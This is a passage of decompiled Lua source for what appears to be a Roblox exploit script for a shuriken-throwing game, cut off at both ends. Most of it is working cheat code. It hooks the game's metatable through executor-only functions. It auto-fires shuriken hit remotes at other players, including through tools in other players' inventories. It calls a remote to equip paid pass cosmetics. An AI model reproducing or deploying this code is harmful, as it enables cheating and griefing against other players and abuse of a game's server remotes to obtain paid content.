                if game:GetService("CoreGui").TopBarApp.TopBarApp.UnibarLeftFrame:FindFirstChild("HealthBar").Visible ~= true then
                    vu85.LayoutOrder = 0
                    vu76.LayoutOrder = 3
                    vu82.LayoutOrder = 2
                    vu79.LayoutOrder = 1
                else
                    vu85.LayoutOrder = 3
                    vu76.LayoutOrder = 2
                    vu82.LayoutOrder = 1
                    vu79.LayoutOrder = 0
                end
            end)
        end
        vu101 = vu99()
        v97.Heartbeat:Connect(v106)
    end,
    AntiMobileGlitch = function()
        if vu54.TouchEnabled then
            task.spawn(function()
                local v107, v108, v109 = pairs(vu53.LocalPlayer.PlayerGui:GetChildren())
                while true do
                    local v110
                    v109, v110 = v107(v108, v109)
                    if v109 == nil then
                        break
                    end
                    if v110.Name == "ScreenGui" and v110:FindFirstChild("Frame") then
                        v110:Destroy()
                    end
                end
                repeat
                    task.wait()
                until vu53.LocalPlayer.PlayerGui:FindFirstChild("PlayerScript")
                vu53.LocalPlayer.PlayerGui.PlayerScript:Clone().Parent = vu53.LocalPlayer.PlayerGui
                repeat
                    task.wait()
                until vu53.LocalPlayer.PlayerGui:FindFirstChild("GuiScript")
                vu53.LocalPlayer.PlayerGui.GuiScript:Clone().Parent = vu53.LocalPlayer.PlayerGui
            end)
            function vu71.CharacterAdded.AntiMobileGlitch()
                task.spawn(function()
                    vu71.CheckAllParts(vu64)
                    local v111, v112, v113 = pairs(vu63.PlayerGui:GetChildren())
                    while true do
                        local v114
                        v113, v114 = v111(v112, v113)
                        if v113 == nil then
                            break
                        end
                        if v114.Name == "ScreenGui" and v114:FindFirstChild("Frame") then
                            v114:Destroy()
                        end
                    end
                    repeat
                        task.wait()
                    until vu53.LocalPlayer.PlayerGui:FindFirstChild("PlayerScript")
                    vu53.LocalPlayer.PlayerGui.PlayerScript:Clone().Parent = vu53.LocalPlayer.PlayerGui
                    repeat
                        task.wait()
                    until vu53.LocalPlayer.PlayerGui:FindFirstChild("GuiScript")
                    vu53.LocalPlayer.PlayerGui.GuiScript:Clone().Parent = vu53.LocalPlayer.PlayerGui
                end)
            end
        end
    end,
    Cutestring = function()
        if getrawmetatable then
            getgenv().Meow = false
            faces = {
                ";;w;;",
                "UwU",
                ">w<",
                "^w^",
                "OwO",
                "UwU",
                "xD"
            }
            local function vu115()
                return faces[math.random(1, # faces)]
            end
            local function vu118(p116)
                local v117 = {
                    r = "w",
                    R = "W",
                    l = "w",
                    L = "W",
                    ove = "uv"
                }
                return p116:gsub("[rRlL]", v117):gsub("ove", v117.ove):gsub("!", vu115)
            end
            local v119 = getrawmetatable(game)
            local vu120 = v119.__namecall
            setreadonly(v119, false)
            v119.__namecall = newcclosure(function(...)
                local v121 = {
                    ...
                }
                if getnamecallmethod() ~= "FireServer" or (v121[1].Name ~= "SayMessageRequest" or not getgenv().Meow) then
                    return vu120(...)
                end
                v121[2] = vu118(v121[2])
                return vu120(unpack(v121))
            end)
            setreadonly(v119, true)
        end
    end,
    ChatFixer = function()
        local v122 = vu62.ChatWindowConfiguration
        v122.FontFace = Font.fromName("Balthazar", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
        v122.TextSize = 18
        local v123 = vu62.ChatInputBarConfiguration
        v123.FontFace = Font.fromName("SourceSansPro", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
        v123.TextSize = 18
        local v124 = vu62.BubbleChatConfiguration
        v124.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        v124.FontFace = Font.fromName("Balthazar", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
        v124.TextColor3 = Color3.fromRGB(255, 255, 200)
        v124.TextSize = 24
        v124.MaxBubbles = 6
    end,
    SolaraFixer = function()
        local v125 = {}
        local vu126 = {
            "ALL",
            "ClothCollection",
            "ForceFieldDetectorParts",
            "FunnySwordPack",
            "FunnyThrowPack",
            "GroupMemberCloth",
            "LeaderBoard",
            "MainBasePlate",
            "NextUpdatePart",
            "NightLightParts",
            "PizzaPack",
            "RainbowPack",
            "RandomMeshes",
            "RandomModels",
            "RandomParts",
            "RandomUnions",
            "SpawnParts",
            "SwordCollection",
            "ThrowableCollection",
            "VipPack",
            "WaterFallSoundPart"
        }
        local function v132(p127)
            local v128, v129, v130 = pairs(vu126)
            while true do
                local v131
                v130, v131 = v128(v129, v130)
                if v130 == nil then
                    break
                end
                if p127:FindFirstAncestor(v131) then
                    return v131
                end
            end
        end
        local v133, v134, v135 = pairs(game:GetDescendants())
        while true do
            local v136, v137 = v133(v134, v135)
            if v136 == nil then
                break
            end
            v135 = v136
            if v137:IsA("BasePart") and (v132(v137) and v137.Name ~= "Seat") then
                v125[v137] = {
                    v137.CFrame,
                    v137.Rotation,
                    false
                }
            end
        end
for part, data in pairs(v125) do
    part:GetPropertyChangedSignal("Position"):Connect(function()
        if not data[3] then
            data[3] = true
            part.CFrame = data[1]
            part.Rotation = data[2]
            task.wait()
            data[3] = false
        end
    end)
end
    end,
    QualityOfLifeImprover = function()
        local v142 = Instance.new("Sky", vu60)
        v142.MoonTextureId = "http://www.roblox.com/asset/?id=415755273"
        v142.StarCount = 5000
        workspace.FallenPartsDestroyHeight = - 50000
        vu60.FogEnd = 5000
        if vu60.Technology ~= Enum.Technology.Compatibility then
            local v143, v144, v145 = pairs(workspace:GetDescendants())
            while true do
                local v146
                v145, v146 = v143(v144, v145)
                if v145 == nil then
                    break
                end
                if v146:IsA("Light") and v146.Brightness > 1 then
                    v146.Brightness = 1
                end
            end
        end
    end
}
local vu455 = {
    AutoFire = {
        ["0000"] = function(p148)
            if vu64 and vu64:FindFirstChild("Shuriken") then
                local v149 = vu64
                local v150, v151, v152 = pairs(v149:GetChildren())
                while true do
                    local v153
                    v152, v153 = v150(v151, v152)
                    if v152 == nil then
                        break
                    end
                    if v153.Name == "Shuriken" and (p148 and p148.Character) and p148.Character:FindFirstChild(vu70.AimPart) then
                        v153:FindFirstChild("HitEvent"):FireServer(p148.Character:FindFirstChild(vu70.AimPart).Position)
                    end
                end
            end
            if vu70.OptionalEquip then
                local v154, v155, v156 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                while true do
                    local v157
                    v156, v157 = v154(v155, v156)
                    if v156 == nil then
                        break
                    end
                    if v157.Name == "Shuriken" and (p148 and p148.Character) and p148.Character:FindFirstChild(vu70.AimPart) then
                        v157:FindFirstChild("HitEvent"):FireServer(p148.Character:FindFirstChild(vu70.AimPart).Position)
                    end
                end
            end
        end,
        ["1000"] = function(p158)
            if vu64 and (vu64:FindFirstChild("Shuriken") and vu71.GetRoot(vu64)) then
                local v159 = vu71.GetRoot(vu64)
                local v160 = vu64
                local v161, v162, v163 = pairs(v160:GetChildren())
                while true do
                    local v164
                    v163, v164 = v161(v162, v163)
                    if v163 == nil then
                        break
                    end
                    if v164.Name == "Shuriken" then
                        if table.find(vu70.PlrsTooClose, p158.Name) then
                            v164:FindFirstChild("HitEvent"):FireServer(vu71.GetAimPart(p158.Character).Position)
                        else
                            v164:FindFirstChild("HitEvent"):FireServer(Vector3.new(v159.Position.X, v159.Position.Y + vu70.AirStrikeDistance, v159.Position.Z))
                        end
                    end
                end
            elseif vu64 and (vu71.GetRoot(vu64) and vu70.OptionalEquip) then
                local v165 = vu71.GetRoot(vu64)
                local v166, v167, v168 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                while true do
                    local v169
                    v168, v169 = v166(v167, v168)
                    if v168 == nil then
                        break
                    end
                    if v169.Name == "Shuriken" then
                        if table.find(vu70.PlrsTooClose, p158.Name) then
                            v169:FindFirstChild("HitEvent"):FireServer(vu71.GetAimPart(p158.Character).Position)
                        else
                            v169:FindFirstChild("HitEvent"):FireServer(Vector3.new(v165.Position.X, v165.Position.Y + vu70.AirStrikeDistance, v165.Position.Z))
                        end
                    end
                end
            end
        end,
        ["0100"] = function(_, p170, p171)
            if workspace:FindFirstChild("SPEEDPART") and vu64 and vu64:FindFirstChild("Shuriken") then
                local v172 = vu64
                local v173, v174, v175 = pairs(v172:GetChildren())
                while true do
                    local v176
                    v175, v176 = v173(v174, v175)
                    if v175 == nil then
                        break
                    end
                    if v176.Name == "Shuriken" then
                        v176:FindFirstChild("HitEvent"):FireServer(workspace:FindFirstChild("SPEEDPART").Position)
                        if p170 and vu64:FindFirstChild("Humanoid") then
                            local v177, v178, v179 = pairs(p171)
                            while true do
                                local v180
                                v179, v180 = v177(v178, v179)
                                if v179 == nil then
                                    break
                                end
                                v180:Stop()
                            end
                            p171.ThrowAnim = vu64:FindFirstChild("Humanoid"):WaitForChild("Animator"):LoadAnimation(v176:FindFirstChild("LocalScript"):FindFirstChild("ThrowAnim"))
                            p171.ThrowAnim:Play()
                            p170 = false
                        end
                    end
                end
            end
        end,
        ["0010"] = function(p181, p182)
            local v183 = vu53
            local v184, v185, v186 = pairs(v183:GetPlayers())
            while true do
                local v187
                v186, v187 = v184(v185, v186)
                if v186 == nil then
                    break
                end
                if vu70.PlayerShurikenCheck and v187 ~= p181 or not vu70.PlayerShurikenCheck then
                    if v187:FindFirstChild("Backpack") and v187.Backpack:FindFirstChild("Shuriken") then
                        local v188, v189, v190 = pairs(v187.Backpack:GetChildren())
                        while true do
                            local v191
                            v190, v191 = v188(v189, v190)
                            if v190 == nil then
                                break
                            end
                            if v191.Name == "Shuriken" and (v191:FindFirstChild("HitEvent") and (p181 and p181.Character)) and p181.Character:FindFirstChild(vu70.AimPart) then
                                v191.HitEvent:FireServer(p181.Character:FindFirstChild(vu70.AimPart).Position)
                                p182()
                            end
                        end
                    end
                    if v187.Character and v187.Character:FindFirstChild("Shuriken") then
                        local v192, v193, v194 = pairs(v187.Character:GetChildren())
                        while true do
                            local v195
                            v194, v195 = v192(v193, v194)
                            if v194 == nil then
                                break
                            end
                            if v195.Name == "Shuriken" and (v195:FindFirstChild("HitEvent") and (p181 and p181.Character)) and p181.Character:FindFirstChild(vu70.AimPart) then
                                v195.HitEvent:FireServer(p181.Character:FindFirstChild(vu70.AimPart).Position)
                                p182()
                            end
                        end
                    end
                end
            end
        end,
        ["0001"] = function(p196)
            if vu64 and vu64:FindFirstChild("Shuriken") then
                local v197 = vu64
                local v198, v199, v200 = pairs(v197:GetChildren())
                while true do
                    local v201
                    v200, v201 = v198(v199, v200)
                    if v200 == nil then
                        break
                    end
                    if v201.Name == "Shuriken" and (p196 and p196.Character) and p196.Character:FindFirstChild(vu70.AimPart) then
                        local v202 = math.random(- 100, 100)
                        local v203 = math.random(- 100, 100)
                        local v204 = math.random(- 100, 100)
                        local v205 = p196.Character:FindFirstChild(vu70.AimPart)
                        local v206 = Vector3.new(v205.Position.X + v202, v205.Position.Y + v203, v205.Position.Z + v204)
                        v201:FindFirstChild("HitEvent"):FireServer(v206)
                    end
                end
            end
            if vu70.OptionalEquip then
                local v207, v208, v209 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                while true do
                    local v210
                    v209, v210 = v207(v208, v209)
                    if v209 == nil then
                        break
                    end
                    if v210.Name == "Shuriken" and (p196 and p196.Character) and p196.Character:FindFirstChild(vu70.AimPart) then
                        local v211 = math.random(- 100, 100)
                        local v212 = math.random(- 100, 100)
                        local v213 = math.random(- 100, 100)
                        local v214 = p196.Character:FindFirstChild(vu70.AimPart)
                        local v215 = Vector3.new(v214.Position.X + v211, v214.Position.Y + v212, v214.Position.Z + v213)
                        v210:FindFirstChild("HitEvent"):FireServer(v215)
                    end
                end
            end
        end,
        ["0011"] = function(p216, p217)
            local v218 = vu53
            local v219, v220, v221 = pairs(v218:GetPlayers())
            while true do
                local v222
                v221, v222 = v219(v220, v221)
                if v221 == nil then
                    break
                end
                if vu70.PlayerShurikenCheck and v222 ~= p216 or not vu70.PlayerShurikenCheck then
                    if v222:FindFirstChild("Backpack") and v222.Backpack:FindFirstChild("Shuriken") then
                        local v223, v224, v225 = pairs(v222.Backpack:GetChildren())
                        while true do
                            local v226
                            v225, v226 = v223(v224, v225)
                            if v225 == nil then
                                break
                            end
                            if v226.Name == "Shuriken" and (v226:FindFirstChild("HitEvent") and (p216 and p216.Character)) and p216.Character:FindFirstChild(vu70.AimPart) then
                                local v227 = math.random(- 100, 100)
                                local v228 = math.random(- 100, 100)
                                local v229 = math.random(- 100, 100)
                                local v230 = p216.Character:FindFirstChild(vu70.AimPart)
                                local v231 = Vector3.new(v230.Position.X + v227, v230.Position.Y + v228, v230.Position.Z + v229)
                                v226.HitEvent:FireServer(v231)
                                p217()
                            end
                        end
                    end
                    if v222.Character and v222.Character:FindFirstChild("Shuriken") then
                        local v232, v233, v234 = pairs(v222.Character:GetChildren())
                        while true do
                            local v235
                            v234, v235 = v232(v233, v234)
                            if v234 == nil then
                                break
                            end
                            if v235.Name == "Shuriken" and (v235:FindFirstChild("HitEvent") and (p216 and p216.Character)) and p216.Character:FindFirstChild(vu70.AimPart) then
                                local v236 = math.random(- 100, 100)
                                local v237 = math.random(- 100, 100)
                                local v238 = math.random(- 100, 100)
                                local v239 = p216.Character:FindFirstChild(vu70.AimPart)
                                local v240 = Vector3.new(v239.Position.X + v236, v239.Position.Y + v237, v239.Position.Z + v238)
                                v235.HitEvent:FireServer(v240)
                                p217()
                            end
                        end
                    end
                end
            end
        end,
        ["1010"] = function(p241, p242)
            if vu64 and vu71.GetRoot(vu64) then
                local v243 = vu71.GetRoot(vu64)
                local v244 = vu53
                local v245, v246, v247 = pairs(v244:GetPlayers())
                while true do
                    local v248
                    v247, v248 = v245(v246, v247)
                    if v247 == nil then
                        break
                    end
                    if vu70.PlayerShurikenCheck and v248 ~= p241 or not vu70.PlayerShurikenCheck then
                        if v248:FindFirstChild("Backpack") and v248.Backpack:FindFirstChild("Shuriken") then
                            local v249, v250, v251 = pairs(v248.Backpack:GetChildren())
                            while true do
                                local v252
                                v251, v252 = v249(v250, v251)
                                if v251 == nil then
                                    break
                                end
                                if v252.Name == "Shuriken" and v252:FindFirstChild("HitEvent") then
                                    if table.find(vu70.PlrsTooClose, p241.Name) then
                                        v252.HitEvent:FireServer(vu71.GetAimPart(p241.Character).Position)
                                    else
                                        v252.HitEvent:FireServer(Vector3.new(v243.Position.X, v243.Position.Y + vu70.AirStrikeDistance, v243.Position.Z))
                                    end
                                    p242()
                                end
                            end
                        end
                        if v248.Character and v248.Character:FindFirstChild("Shuriken") then
                            local v253, v254, v255 = pairs(v248.Character:GetChildren())
                            while true do
                                local v256
                                v255, v256 = v253(v254, v255)
                                if v255 == nil then
                                    break
                                end
                                if v256.Name == "Shuriken" and v256:FindFirstChild("HitEvent") then
                                    if table.find(vu70.PlrsTooClose, p241.Name) then
                                        v256.HitEvent:FireServer(vu71.GetAimPart(p241.Character).Position)
                                    else
                                        v256.HitEvent:FireServer(Vector3.new(v243.Position.X, v243.Position.Y + vu70.AirStrikeDistance, v243.Position.Z))
                                    end
                                    p242()
                                end
                            end
                        end
                    end
                end
            end
        end,
        ["1001"] = function(_)
            if vu64 and vu71.GetRoot(vu64) then
                local v257 = vu71.GetRoot(vu64)
                if vu64 and vu64:FindFirstChild("Shuriken") then
                    local v258 = vu64
                    local v259, v260, v261 = pairs(v258:GetChildren())
                    while true do
                        local v262
                        v261, v262 = v259(v260, v261)
                        if v261 == nil then
                            break
                        end
                        if v262.Name == "Shuriken" then
                            local v263 = math.random(- 100, 100)
                            local v264 = math.random(- 100, 100)
                            local v265 = Vector3.new(v257.Position.X + v263, v257.Position.Y + vu70.ShotgunFireSpread, v257.Position.Z + v264)
                            v262:FindFirstChild("HitEvent"):FireServer(v265)
                        end
                    end
                end
                if vu70.OptionalEquip then
                    local v266, v267, v268 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                    while true do
                        local v269
                        v268, v269 = v266(v267, v268)
                        if v268 == nil then
                            break
                        end
                        if v269.Name == "Shuriken" then
                            local v270 = math.random(- 100, 100)
                            local v271 = math.random(- 100, 100)
                            local v272 = Vector3.new(v257.Position.X + v270, v257.Position.Y + vu70.ShotgunFireSpread, v257.Position.Z + v271)
                            v269:FindFirstChild("HitEvent"):FireServer(v272)
                        end
                    end
                end
            end
        end,
        ["1011"] = function(p273, p274)
            if vu64 and vu71.GetRoot(vu64) then
                local v275 = vu71.GetRoot(vu64)
                local v276 = vu53
                local v277, v278, v279 = pairs(v276:GetPlayers())
                while true do
                    local v280
                    v279, v280 = v277(v278, v279)
                    if v279 == nil then
                        break
                    end
                    if vu70.PlayerShurikenCheck and v280 ~= p273 or not vu70.PlayerShurikenCheck then
                        if v280:FindFirstChild("Backpack") and v280.Backpack:FindFirstChild("Shuriken") then
                            local v281, v282, v283 = pairs(v280.Backpack:GetChildren())
                            while true do
                                local v284
                                v283, v284 = v281(v282, v283)
                                if v283 == nil then
                                    break
                                end
                                if v284.Name == "Shuriken" and v284:FindFirstChild("HitEvent") then
                                    local v285 = math.random(- 100, 100)
                                    local v286 = math.random(- 100, 100)
                                    local v287 = Vector3.new(v275.Position.X + v285, v275.Position.Y + vu70.ShotgunFireSpread, v275.Position.Z + v286)
                                    v284.HitEvent:FireServer(v287)
                                    p274()
                                end
                            end
                        end
                        if v280.Character and v280.Character:FindFirstChild("Shuriken") then
                            local v288, v289, v290 = pairs(v280.Character:GetChildren())
                            while true do
                                local v291
                                v290, v291 = v288(v289, v290)
                                if v290 == nil then
                                    break
                                end
                                if v291.Name == "Shuriken" and v291:FindFirstChild("HitEvent") then
                                    local v292 = math.random(- 100, 100)
                                    local v293 = math.random(- 100, 100)
                                    local v294 = Vector3.new(v275.Position.X + v292, v275.Position.Y + vu70.ShotgunFireSpread, v275.Position.Z + v293)
                                    v291.HitEvent:FireServer(v294)
                                    p274()
                                end
                            end
                        end
                    end
                end
            end
        end
    },
    HoldClick = {
        ["0000"] = function(p295)
            if vu64 and vu64:FindFirstChild(p295) then
                local v296 = vu64
                local v297, v298, v299 = pairs(v296:GetChildren())
                while true do
                    local v300
                    v299, v300 = v297(v298, v299)
                    if v299 == nil then
                        break
                    end
                    if v300.Name == p295 and vu70.Holding[p295] then
                        if v300.Enabled == false then
                            v300.Enabled = true
                        end
                        v300:Activate()
                    end
                end
            end
            if vu70.OptionalEquip and (vu53.LocalPlayer:FindFirstChild("Backpack") and vu53.LocalPlayer.Backpack:FindFirstChild(p295)) then
                local v301, v302, v303 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                while true do
                    local v304
                    v303, v304 = v301(v302, v303)
                    if v303 == nil then
                        break
                    end
                    if v304.Name == p295 and vu70.Holding[p295] then
                        if v304.Enabled == false then
                            v304.Enabled = true
                        end
                        v304:FindFirstChild("HitEvent"):FireServer(vu65.Hit.p)
                    end
                end
            end
        end,
        ["1000"] = function(p305)
            if vu64 then
                local v306 = vu71.GetRoot(vu64)
                if v306 then
                    local v307 = vu64
                    local v308, v309, v310 = pairs(v307:GetChildren())
                    while true do
                        local v311
                        v310, v311 = v308(v309, v310)
                        if v310 == nil then
                            break
                        end
                        if v311.Name == p305 and vu70.Holding[p305] then
                            if v311.Enabled == true then
                                v311.Enabled = false
                            end
                            v311:FindFirstChild("HitEvent"):FireServer(Vector3.new(v306.Position.X, v306.Position.Y + 500, v306.Position.Z))
                        end
                    end
                end
            end
            if vu70.OptionalEquip and (vu53.LocalPlayer:FindFirstChild("Backpack") and vu53.LocalPlayer.Backpack:FindFirstChild(p305)) then
                local v312, v313, v314 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                while true do
                    local v315
                    v314, v315 = v312(v313, v314)
                    if v314 == nil then
                        break
                    end
                    if v315.Name == p305 and (vu64 and (vu71.GetRoot(vu64) and vu70.Holding[p305])) then
                        local v316 = vu71.GetRoot(vu64)
                        if v315.Enabled == true then
                            v315.Enabled = false
                        end
                        v315:FindFirstChild("HitEvent"):FireServer(Vector3.new(v316.Position.X, v316.Position.Y + 500, v316.Position.Z))
                    end
                end
            end
        end,
        ["0010"] = function(p317, p318)
            local v319 = vu53
            local v320, v321, v322 = pairs(v319:GetPlayers())
            while true do
                local v323
                v322, v323 = v320(v321, v322)
                if v322 == nil then
                    break
                end
                if v323:FindFirstChild("Backpack") and v323.Backpack:FindFirstChild("Shuriken") then
                    local v324, v325, v326 = pairs(v323.Backpack:GetChildren())
                    while true do
                        local v327
                        v326, v327 = v324(v325, v326)
                        if v326 == nil then
                            break
                        end
                        if v327.Name == "Shuriken" and (v327:FindFirstChild("HitEvent") and vu70.Holding[p317]) then
                            v327.HitEvent:FireServer(vu65.Hit.p)
                            p318("AutoFireWait", false)
                        end
                    end
                end
                if v323.Character and v323.Character:FindFirstChild("Shuriken") then
                    local v328, v329, v330 = pairs(v323.Character:GetChildren())
                    while true do
                        local v331
                        v330, v331 = v328(v329, v330)
                        if v330 == nil then
                            break
                        end
                        if v331.Name == "Shuriken" and (v331:FindFirstChild("HitEvent") and vu70.Holding[p317]) then
                            v331.HitEvent:FireServer(vu65.Hit.p)
                            p318("AutoFireWait", false)
                        end
                    end
                end
            end
        end,
        ["1010"] = function(p332, p333)
            local v334 = vu64 and vu71.GetRoot(vu64)
            if v334 then
                local v335 = vu53
                local v336, v337, v338 = pairs(v335:GetPlayers())
                while true do
                    local v339
                    v338, v339 = v336(v337, v338)
                    if v338 == nil then
                        break
                    end
                    if v339:FindFirstChild("Backpack") and v339.Backpack:FindFirstChild("Shuriken") then
                        local v340, v341, v342 = pairs(v339.Backpack:GetChildren())
                        while true do
                            local v343
                            v342, v343 = v340(v341, v342)
                            if v342 == nil then
                                break
                            end
                            if v343.Name == "Shuriken" and (v343:FindFirstChild("HitEvent") and vu70.Holding[p332]) then
                                v343:FindFirstChild("HitEvent"):FireServer(Vector3.new(v334.Position.X, v334.Position.Y + 500, v334.Position.Z))
                                p333("AutoFireWait", false)
                            end
                        end
                    end
                    if v339.Character and v339.Character:FindFirstChild("Shuriken") then
                        local v344, v345, v346 = pairs(v339.Character:GetChildren())
                        while true do
                            local v347
                            v346, v347 = v344(v345, v346)
                            if v346 == nil then
                                break
                            end
                            if v347.Name == "Shuriken" and (v347:FindFirstChild("HitEvent") and vu70.Holding[p332]) then
                                v347:FindFirstChild("HitEvent"):FireServer(Vector3.new(v334.Position.X, v334.Position.Y + 500, v334.Position.Z))
                                p333("AutoFireWait", false)
                            end
                        end
                    end
                end
            end
        end,
        ["1001"] = function(p348)
            local v349 = vu64 and vu71.GetRoot(vu64)
            if v349 then
                if vu64:FindFirstChild("Shuriken") then
                    local v350 = vu64
                    local v351, v352, v353 = pairs(v350:GetChildren())
                    while true do
                        local v354
                        v353, v354 = v351(v352, v353)
                        if v353 == nil then
                            break
                        end
                        if v354.Name == "Shuriken" and vu70.Holding[p348] then
                            local v355 = math.random(- 100, 100)
                            local v356 = math.random(- 100, 100)
                            local v357 = Vector3.new(v349.Position.X + v355, v349.Position.Y + vu70.ShotgunFireSpread, v349.Position.Z + v356)
                            v354:FindFirstChild("HitEvent"):FireServer(v357)
                        end
                    end
                end
                if vu70.OptionalEquip then
                    local v358, v359, v360 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                    while true do
                        local v361
                        v360, v361 = v358(v359, v360)
                        if v360 == nil then
                            break
                        end
                        if v361.Name == "Shuriken" and vu70.Holding[p348] then
                            local v362 = math.random(- 100, 100)
                            local v363 = math.random(- 100, 100)
                            local v364 = Vector3.new(v349.Position.X + v362, v349.Position.Y + vu70.ShotgunFireSpread, v349.Position.Z + v363)
                            v361:FindFirstChild("HitEvent"):FireServer(v364)
                        end
                    end
                end
            end
        end,
        ["0001"] = function(p365)
            local v366 = vu64 and vu71.GetRoot(vu64)
            if v366 then
                if vu64:FindFirstChild("Shuriken") then
                    local v367 = vu64
                    local v368, v369, v370 = pairs(v367:GetChildren())
                    while true do
                        local v371
                        v370, v371 = v368(v369, v370)
                        if v370 == nil then
                            break
                        end
                        if v371.Name == "Shuriken" and vu70.Holding[p365] then
                            local v372 = math.random(- 100, 100)
                            local v373 = math.random(- 100, 100)
                            local v374 = math.random(- 100, 100)
                            local v375 = CFrame.new(v366.Position, vu65.Hit.p).LookVector * vu70.ShotgunFireSpread + Vector3.new(v372, v373, v374)
                            v371:FindFirstChild("HitEvent"):FireServer(v375)
                        end
                    end
                end
                if vu70.OptionalEquip then
                    local v376, v377, v378 = pairs(vu53.LocalPlayer.Backpack:GetChildren())
                    while true do
                        local v379
                        v378, v379 = v376(v377, v378)
                        if v378 == nil then
                            break
                        end
                        if v379.Name == "Shuriken" and vu70.Holding[p365] then
                            local v380 = math.random(- 100, 100)
                            local v381 = math.random(- 100, 100)
                            local v382 = math.random(- 100, 100)
                            local v383 = CFrame.new(v366.Position, vu65.Hit.p).LookVector * vu70.ShotgunFireSpread + Vector3.new(v380, v381, v382)
                            v379:FindFirstChild("HitEvent"):FireServer(v383)
                        end
                    end
                end
            end
        end,
        ["1011"] = function(p384, p385)
            local v386 = vu64 and vu71.GetRoot(vu64)
            if v386 then
                local v387 = vu53
                local v388, v389, v390 = pairs(v387:GetPlayers())
                while true do
                    local v391
                    v390, v391 = v388(v389, v390)
                    if v390 == nil then
                        break
                    end
                    if v391:FindFirstChild("Backpack") and v391.Backpack:FindFirstChild("Shuriken") then
                        local v392, v393, v394 = pairs(v391.Backpack:GetChildren())
                        while true do
                            local v395
                            v394, v395 = v392(v393, v394)
                            if v394 == nil then
                                break
                            end
                            if v395.Name == "Shuriken" and (v395:FindFirstChild("HitEvent") and vu70.Holding[p384]) then
                                local v396 = math.random(- 100, 100)
                                local v397 = math.random(- 100, 100)
                                local v398 = Vector3.new(v386.Position.X + v396, v386.Position.Y + vu70.ShotgunFireSpread, v386.Position.Z + v397)
                                v395.HitEvent:FireServer(v398)
                                p385("AutoFireWait", false)
                            end
                        end
                    end
                    if v391.Character and v391.Character:FindFirstChild("Shuriken") then
                        local v399, v400, v401 = pairs(v391.Character:GetChildren())
                        while true do
                            local v402
                            v401, v402 = v399(v400, v401)
                            if v401 == nil then
                                break
                            end
                            if v402.Name == "Shuriken" and (v402:FindFirstChild("HitEvent") and vu70.Holding[p384]) then
                                local v403 = math.random(- 100, 100)
                                local v404 = math.random(- 100, 100)
                                local v405 = Vector3.new(v386.Position.X + v403, v386.Position.Y + vu70.ShotgunFireSpread, v386.Position.Z + v404)
                                v402.HitEvent:FireServer(v405)
                                p385("AutoFireWait", false)
                            end
                        end
                    end
                end
            end
        end,
        ["0011"] = function(p406, p407)
            local v408 = vu64 and vu71.GetRoot(vu64)
            if v408 then
                local v409 = vu53
                local v410, v411, v412 = pairs(v409:GetPlayers())
                while true do
                    local v413
                    v412, v413 = v410(v411, v412)
                    if v412 == nil then
                        break
                    end
                    if v413:FindFirstChild("Backpack") and v413.Backpack:FindFirstChild("Shuriken") then
                        local v414, v415, v416 = pairs(v413.Backpack:GetChildren())
                        while true do
                            local v417
                            v416, v417 = v414(v415, v416)
                            if v416 == nil then
                                break
                            end
                            if v417.Name == "Shuriken" and (v417:FindFirstChild("HitEvent") and vu70.Holding[p406]) then
                                local v418 = math.random(- 100, 100)
                                local v419 = math.random(- 100, 100)
                                local v420 = math.random(- 100, 100)
                                local v421 = CFrame.new(v408.Position, vu65.Hit.p).LookVector * vu70.ShotgunFireSpread + Vector3.new(v418, v419, v420)
                                v417.HitEvent:FireServer(v421)
                                p407("AutoFireWait", false)
                            end
                        end
                    end
                    if v413.Character and v413.Character:FindFirstChild("Shuriken") then
                        local v422, v423, v424 = pairs(v413.Character:GetChildren())
                        while true do
                            local v425
                            v424, v425 = v422(v423, v424)
                            if v424 == nil then
                                break
                            end
                            if v425.Name == "Shuriken" and (v425:FindFirstChild("HitEvent") and vu70.Holding[p406]) then
                                local v426 = math.random(- 100, 100)
                                local v427 = math.random(- 100, 100)
                                local v428 = math.random(- 100, 100)
                                local v429 = CFrame.new(v408.Position, vu65.Hit.p).LookVector * vu70.ShotgunFireSpread + Vector3.new(v426, v427, v428)
                                v425.HitEvent:FireServer(v429)
                                p407("AutoFireWait", false)
                            end
                        end
                    end
                end
            end
        end,
        ["0100"] = function(p430, p431)
            if workspace:FindFirstChild("SPEEDPART") and vu64 and vu64:FindFirstChild("Shuriken") then
                local v432 = vu64
                local v433, v434, v435 = pairs(v432:GetChildren())
                while true do
                    local v436
                    v435, v436 = v433(v434, v435)
                    if v435 == nil then
                        break
                    end
                    if v436.Name == "Shuriken" and v436:FindFirstChild("HitEvent") then
                        v436.HitEvent:FireServer(workspace:FindFirstChild("SPEEDPART").Position)
                        if p431 and vu64:FindFirstChild("Humanoid") then
                            local v437, v438, v439 = pairs(p430)
                            while true do
                                local v440
                                v439, v440 = v437(v438, v439)
                                if v439 == nil then
                                    break
                                end
                                v440:Stop()
                            end
                            p430.ThrowAnim = vu64:FindFirstChild("Humanoid"):WaitForChild("Animator"):LoadAnimation(v436:FindFirstChild("LocalScript"):FindFirstChild("ThrowAnim"))
                            p430.ThrowAnim:Play()
                            p431 = false
                        end
                    end
                end
            end
        end
    },
    ChangeCosmetic = {
        Clothing = function(p441)
            local v442 = ({
                r = "RainbowPass",
                p = "PizzaPass",
                v = "VipPass",
                g = "GroupMemberCloth"
            })[string.lower(string.sub(p441, 1, 1))] or nil
            if v442 then
                vu66:FireServer(v442, p441)
            else
                vu66:FireServer("Cloth", p441)
            end
        end,
        Shuriken = function(pu443)
            local v448 = (function()
                local v444, v445, v446 = pairs(vu73.ShurikenPacks)
                while true do
                    local v447
                    v446, v447 = v444(v445, v446)
                    if v446 == nil then
                        break
                    end
                    if table.find(v447, pu443) then
                        return v446
                    end
                end
                return nil
            end)()
            if v448 then
                vu66:FireServer(v448, pu443)
            end
        end,
        Sword = function(pu449)
            local v454 = (function()
                local v450, v451, v452 = pairs(vu73.SwordPacks)
                while true do
                    local v453
                    v452, v453 = v450(v451, v452)
                    if v452 == nil then
                        break
                    end
                    if table.find(v453, pu449) then
                        return v452
                    end
                end
                return nil
